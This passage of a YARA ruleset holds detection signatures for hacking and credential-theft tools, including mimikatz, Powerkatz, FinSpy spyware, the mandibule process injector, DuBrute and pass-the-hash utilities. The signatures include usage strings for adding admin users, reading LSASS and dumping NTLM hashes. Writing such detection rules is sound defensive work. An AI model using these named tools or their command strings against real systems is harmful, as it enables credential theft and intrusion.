%s/%s\" fullword ascii\n\t\t$s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule GoodToolset_ms11080 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f0854c49eddf807f3a7381d3b20f9af4a3024e9f\"\n\tstrings:\n\t\t$s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s5 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s6 = \"[>] ms11-08 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule epathobj_exp64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"09195ba4e25ccce35c188657957c0f2c6a61d083\"\n\tstrings:\n\t\t$s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s2 = \"Exploit ok run command\" fullword ascii\n\t\t$s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\t\t$s6 = \"- inconsistent onexit begin-end variables\" fullword wide  /* Goodware String - occured 96 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule kelloworld_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kelloworld.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\tstrings:\n\t\t$s1 = \"Hello World!\" fullword wide\n\t\t$s2 = \"kelloworld.dll\" fullword ascii\n\t\t$s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule HScan_v1_20_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n\t\t$s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule _Project1_Generate_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\t\thash1 = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\t\thash2 = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"sfUserAppDataRoaming\" fullword ascii\n\t\t$s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n\t\t$s3 = \"delphi32.exe\" fullword ascii\n\t\t$s4 = \"hkeyCurrentUser\" fullword ascii\n\t\t$s5 = \"%s is not a valid IP address.\" fullword wide\n\t\t$s6 = \"Citadel hooking error\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule _hscan_hscan_hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\t\thash1 = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\t\thash2 = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n\t\t$s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n\t\t$s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule kiwi_tools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"b5c93489a1b62181594d0fb08cc510d947353bc8\"\n\t\thash8 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash9 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash10 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash11 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash12 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash13 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash14 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash15 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash16 = \"20facf1fa2d87cccf177403ca1a7852128a9a0ab\"\n\t\thash17 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n\t\t$s2 = \"Benjamin Delpy\" fullword ascii\n\t\t$s3 = \"GlobalSign\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule kiwi_tools_gentil_kiwi {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash8 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash9 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash10 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash11 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash12 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash13 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash14 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash15 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"mimikatz\" fullword wide\n\t\t$s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n\t\t$s3 = \"Gentil Kiwi\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule dubrute : bruteforcer toolkit\n{\n    meta:\n        author = \"Christian Rebischke (@sh1bumi)\"\n        date = \"2015-09-05\"\n        description = \"Rules for DuBrute Bruteforcer\"\n        in_the_wild = true\n        family = \"Hackingtool/Bruteforcer\"\n    \n    strings:\n        $a = \"WBrute\"\n        $b = \"error.txt\"\n        $c = \"good.txt\"\n        $d = \"source.txt\"\n        $e = \"bad.txt\"\n        $f = \"Generator IP@Login;Password\"\n\n    condition:\n        //check for MZ Signature at offset 0\n        uint16(0) == 0x5A4D \n\n        and \n\n        //check for dubrute specific strings\n        $a and $b and $c and $d and $e and $f \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule FinSpy_2\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        $mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        $mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        $versions1 = /(f)inspyv2/ nocase\n        $versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx\n}\n\nrule FinSpy\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n        author = \"AlienVault Labs\"\n\n    strings:\n        $filter1 = \"$password14\"\n        $filter2 = \"$screenrec7\"\n        $filter3 = \"$micrec\"\n        $filter4 = \"$skyperec3\"\n        $filter5 = \"$mouserec2\"\n        $filter6 = \"$driver\"\n        $filter7 = \"$janedow2\"\n        $filter8 = \"$bootkit2\"\n\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        //$skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        //$mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        //$mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        //$versions1 = /(f)inspyv2/ nocase\n        //$versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2016-02-05\n\tIdentifier: Powerkatz\n*/\n\nrule Powerkatz_DLL_Generic {\n\tmeta:\n\t\tdescription = \"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"PowerKatz Analysis\"\n\t\tdate = \"2016-02-05\"\n\t\tsuper_rule = 1\n\t\tscore = 80\n\t\thash1 = \"c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae\"\n\t\thash2 = \"1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0\"\n\t\thash3 = \"49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872\"\n\tstrings:\n\t\t$s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n\t\t$s2 = \"%*s  pPublicKey         : \" fullword wide\n\t\t$s3 = \"ad_hoc_network_formed\" fullword wide\n\t\t$s4 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n\t\t$s5 = \"\\\\*.kirbi\" fullword wide\n\n\t\t$c1 = \"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n\t\t$c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them\n}\n\n/* \t\tYara rule to detect ELF Linux process injector toolkit \"mandibule\" generic.\n   \t\tname: TOOLKIT_Mandibule.yar analyzed by unixfreaxjp. \n\t\tresult:\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dynx86-stripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dynx86-UNstripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dun64-UNstripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dyn64-stripped\n\n   \t\tThis Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) \n   \t\tand  open to any user or organization, as long as you use it under this license.\n*/\n\nprivate rule is__str_mandibule_gen1 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$str01 = \"shared arguments too big\" fullword nocase wide ascii\n\t\t$str02 = \"self inject pid: %\" fullword nocase wide ascii\n\t\t$str03 = \"injected shellcode at 0x%lx\" fullword nocase wide ascii        \t\n\t\t$str04 = \"target pid: %d\" fullword nocase wide ascii        \t\n\t\t$str05 = \"mapping '%s' into memory at 0x%lx\" fullword nocase wide ascii\n\t\t$str06 = \"shellcode injection addr: 0x%lx\" fullword nocase wide ascii\n\t\t$str07 = \"loading elf at: 0x%llx\" fullword nocase wide ascii\n\tcondition:\n                4 of them\n}\n\nprivate rule is__hex_top_mandibule64 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$hex01 = { 48 8D 05 43 01 00 00 48 89 E7 FF D0 } // st\n\t\t$hex02 = { 53 48 83 EC 50 48 89 7C 24 08 48 8B 44 24 08 } // mn\n\t\t$hex03 = { 48 81 EC 18 02 00 00 89 7C 24 1C 48 89 74 } // pt\n\t\t$hex04 = { 53 48 81 EC 70 01 01 00 48 89 7C 24 08 48 8D 44 24 20 48 05 00 00 } // ld\n\tcondition:\n                3 of them \n}\n\nprivate rule is__hex_mid_mandibule32 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-06-01\"\n\tstrings:\n\t\t$hex05 = { E8 09 07 00 00 81 C1 FC 1F 00 00 8D 81 26 E1 FF FF } // st\n\t\t$hex06 = { 56 53 83 EC 24 E8 E1 05 00 00 81 C3 D0 1E 00 00 8B 44 24 30} // mn\n\t\t$hex07 = { 81 C3 E8 29 00 00 C7 44 24 0C } // pt\n\t\t$hex08 = { E8 C6 D5 FF FF 83 C4 0C 68 00 01 00 00 } // ld\n\tcondition:\n                3 of them \n}\n\nrule TOOLKIT_Mandibule {\n\tmeta:\n\t\tdescription = \"Generic detection for ELF Linux process injector mandibule generic\"\n\t\treference = \"https://imgur.com/a/MuHSZtC\"\n\t\tauthor = \"unixfreaxjp\"\n\t\torg = \"MalwareMustDie\"\n\t\tdate = \"2018-06-01\"\n\tcondition:\n\t\t((is__str_mandibule_gen1) or (is__hex_mid_mandibule32))\n\t\tor ((is__str_mandibule_gen1) or (is__hex_top_mandibule64))\n\t\tand is__elf\n\t\tand filesize < 30KB \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule whosthere_alt : Toolkit {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de\"\n\tstrings:\n\t\t$s0 = \"WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */\n\t\t$s1 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s2 = \"dump output to a file, -o filename\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"This tool lists the active LSA logon sessions with NTLM credentials.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */\n\t\t$s4 = \"Error: pth.dll is not in the current directory!.\" fullword ascii /* score: '24.00' */\n\t\t$s5 = \"the output format is: username:domain:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s6 = \".\\\\pth.dll\" fullword ascii /* score: '16.00' */\n\t\t$s7 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 280KB and 2 of them\n}\n\nrule iam_alt_iam_alt : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90\"\n\tstrings:\n\t\t$s0 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s1 = \"IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */\n\t\t$s2 = \"This tool allows you to change the NTLM credentials of the current logon session\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */\n\t\t$s3 = \"username:domainname:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s4 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s5 = \"Error: Cannot open LSASS.EXE!.\" fullword ascii /* score: '12.00' */\n\t\t$s6 = \"nthash is too long!.\" fullword ascii /* score: '8.00' */\n\t\t$s7 = \"LSASS HANDLE: %x\" fullword ascii /* score: '5.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule genhash_genhash : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file genhash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f\"\n\tstrings:\n\t\t$s1 = \"genhash.exe <password>\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"Password: %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s4 = \"%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\" fullword ascii /* score: '11.00' */\n\t\t$s5 = \"This tool generates LM and NT hashes.\" fullword ascii /* score: '10.00' */\n\t\t$s6 = \"(hashes format: LM Hash:NT hash)\" fullword ascii /* score: '10.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule iam_iamdll : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iamdll.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602\"\n\tstrings:\n\t\t$s0 = \"LSASRV.DLL\" fullword ascii /* score: '21.00' */\n\t\t$s1 = \"iamdll.dll\" fullword ascii /* score: '21.00' */\n\t\t$s2 = \"ChangeCreds\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule iam_iam : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231\"\n\tstrings:\n\t\t$s1 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s2 = \"iam.exe -h administrator:mydomain:\"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */\n\t\t$s3 = \"An error was encountered when trying to change the current logon credentials!.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */\n\t\t$s4 = \"optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s5 = \"IAM.EXE will try to locate some memory locations instead of using hard-coded values.\" fullword ascii /* score: '26.00' */\n\t\t$s6 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s7 = \"Checking LSASRV.DLL....\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule whosthere_alt_pth : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file pth.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = 